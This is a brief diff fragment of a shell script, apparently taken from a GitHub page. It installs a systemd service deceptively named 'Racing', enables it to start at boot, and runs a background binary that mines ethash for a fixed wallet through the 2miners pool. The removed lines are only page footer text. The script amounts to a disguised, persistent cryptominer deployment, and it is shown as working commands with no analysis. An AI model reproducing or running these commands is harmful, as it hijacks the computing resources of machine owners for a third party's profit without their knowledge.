@@ -31,8 +31,3 @@ sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Serv
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 ./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qxns2ag5sszuvqxqdqkacqytnucgvqt3dhne37j -p x -w $myworker &
-
-    © 2022 GitHub, Inc.
-
-    Terms
-    Privacy
